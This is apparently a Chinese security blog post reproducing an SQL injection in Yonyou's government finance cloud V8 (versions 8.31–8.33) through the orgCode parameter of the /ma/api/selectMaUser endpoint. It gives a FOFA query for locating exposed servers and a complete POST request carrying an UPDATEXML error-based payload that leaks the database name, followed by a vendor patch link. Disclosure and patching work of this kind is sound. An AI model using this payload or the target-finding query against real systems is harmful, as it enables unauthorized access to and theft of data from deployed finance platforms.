#  【漏洞复现】用友A++V8系列产品selectMaUser接口SQL注入漏洞  
PokerSec
                    PokerSec  PokerSec   2026-07-22 10:07  
  
**「先关注，不迷路」**  
## 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
用友政务财务云V8产品定位“享、智、控”理念，享为信息数据的共享、智为智能智慧的运用、控为全面全程的管控。该产品为满足高校行业特性，打造了包含智能收费、场景化缴费服务、智能报销、高校预算管理，其他薪资收入等模块的智慧服务型高校财务共享平台。财务云V8系统/ma/api/selectMaUser接口存在SQL注入漏洞，攻击者可通过orgCode参数构造恶意SQL语句，利用UPDATEXML函数触发数据库错误，获取数据库敏感信息。  
## 影响版本  
  
用友政务财务云V8产品官方在售及提供服务器的版本(8.31、8.32、8.33)。  
## fofa  
  
app="用友-政务财务系统"||body="/df/portal/getYearRgcode.do"  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/oXVNrHPdp9a95ondajPgDicXr8JBAdicoMttJhHDQqLFZwibZC8uXiciaXp2GxwluvaJJ9QJGtc53vgmHehMnmspLW64zHYrcF6G6jpbgZ4tuCU8/640?wx_fmt=png&from=appmsg "")  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  
```
POST /ma/api/selectMaUser HTTP/1.1Host: xxxxX-Requested-With: XMLHttpRequestAccept-Language: zh-CN,zh;q=0.9Accept: */*User-Agent: Mozilla/5.0 (Intel Mac OS X 13_12_1) AppleWebKit/527.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/jsonContent-Length: 86{"orgCode":"1' AND (updatexml(1,concat(0x7e,(select database()),0x7e),1)) AND '1'='1"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/oXVNrHPdp9Y41WWQWdtibxqGqAltajHiar9PQf9FfXNKhr2ibMyKxAcj5c7rqlGXBj28K2DCCscwG26hlQbdBIvlC7fGJfGRl7vfcXqI5icBNZE/640?wx_fmt=png&from=appmsg "")  
## 修复意见  
  
及时更新官方补丁：https://security.yonyou.com/#/patchInfo?identifier=309233a5451d4d349c3bc47937fd4f4e  
  
如有侵权，请及时联系删除。  
  
  
